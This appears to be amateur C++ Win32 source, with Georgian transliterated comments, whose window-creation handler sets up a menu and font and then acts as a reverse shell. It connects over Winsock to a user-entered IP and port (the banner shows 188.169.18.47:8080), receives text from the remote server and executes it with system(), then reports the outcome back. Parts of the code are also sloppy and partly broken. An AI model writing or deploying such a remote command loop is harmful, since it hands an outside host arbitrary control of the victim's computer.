
//---------------------------------------------
UINT create_menu(HWND hwnd)
{
HMENU hmenu=CreateMenu();
	if(!hmenu)
	return GetLastError();

HMENU hmenu_popup_file=CreatePopupMenu();
AppendMenu(hmenu,MF_POPUP,(UINT_PTR)hmenu_popup_file,"&File");
AppendMenu(hmenu_popup_file,MF_STRING,100,"&ABCD");
AppendMenu(hmenu_popup_file,MF_STRING,200,"&RTY");

HMENU hmenu_popup_options=CreatePopupMenu();
AppendMenu(hmenu, MF_POPUP, (UINT_PTR)hmenu_popup_options, "&Options");
AppendMenu(hmenu_popup_options,MF_STRING,300,"&3");
AppendMenu(hmenu_popup_options,MF_STRING,400,"&4");
SetMenu(hwnd,hmenu);
}
//---------------------------------------------
HFONT create_font(HWND hwnd)
{
HFONT hfont;
hfont=CreateFont(23,14,1,1,FW_BOLD,1,1,1,ANSI_CHARSET, 
      OUT_TT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, 
      DEFAULT_PITCH | FF_DONTCARE,"Tahoma");
SendMessage(hwnd,WM_SETFONT,(UINT)hfont,0);
return hfont;
}
//---------------------------------------------
long __stdcall on_create(HWND hwnd,unsigned int message
					, unsigned int wparam,long lparam)
{
HDC hdc=GetDC(GetDesktopWindow());
	//while(1)
	{
		TextOut(hdc,1100,30,"asdada",strlen("asdada"));
	}






	
	//	FreeConsole();
char *ipin;
//scanf("%s",&ipin);
int port = 8080;
string ipAddress;//="127.0.0.1";//=ipin;
cout<<endl<<"________________ 188.169.18.47 __\n";
cout<<"sheiyvane IP->: ";
cin>>ipAddress;
cout<<endl<<"sheiyvane PORT_N->:";
cin>>port;
cout<<endl<<"________________\n";
WSAData data;
WORD ver = MAKEWORD(2,2);
int wsResult = WSAStartup(ver,&data);
if(wsResult != 0)
{

	cerr<<"can't start Winsock, err "<<wsResult<<endl;
	return;
}


SOCKET sock = socket(AF_INET,SOCK_STREAM,0);
if(sock == INVALID_SOCKET)
{


	cerr <<"can't create socket,Err #"<<WSAGetLastError()<<endl;
	WSACleanup();
	return;
}

sockaddr_in hint;
hint.sin_family = AF_INET;
hint.sin_port = htons(port);
inet_pton(AF_INET,ipAddress.c_str(),&hint.sin_addr); /// ver gavigee


int connResult = connect(sock,(sockaddr*)&hint,sizeof(hint));

if(connResult == SOCKET_ERROR)
{

	cerr <<"Can't connect to server ,err "<<WSAGetLastError()<<endl;
	closesocket(sock);
	WSACleanup();
	return;

}
static bool firststart=0;

char buf[4096];
string userInput;
do
{
	cout<< "> ";
//	getline(cin,userInput);
	userInput="SEIYVANE BRDZANEBA :\r\n";
	if(userInput.size()<=0)
	{
		userInput="sheitane striqoni";
	}
	if(userInput.size() > 0) ///    c_str utitebs  userInput ze misamartze rac weria anu send agzavnis orobitshi da cherez operatiulida akitxebs ororbitshi
	{
		int sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
		if(sendResult != SOCKET_ERROR)
		{
			ZeroMemory(buf,4096);
			int bytesReceived = recv(sock,buf,4096,0);
			if(bytesReceived>0)
			{

				cout<< "SERVER> " <<string(buf,0,bytesReceived)<<endl;
					
				int returns =system(buf);
					
				if(returns ==-1)
				{
					userInput="brdaneba shesrulda arasworad an arasrulad \n";
					sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);
					firststart=1;
				}

				if(returns ==0)
				{
					firststart=1;
					userInput=" brdzaneba ar moidzebna\n";
					sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);

				}
				else{

						

						userInput="swori brdzanebaa\n";
						sendResult = send(sock,userInput.c_str(),userInput.size()+1,0);

				}




			}



		}
	
	}

}while(userInput.size()>0);









return 0;
}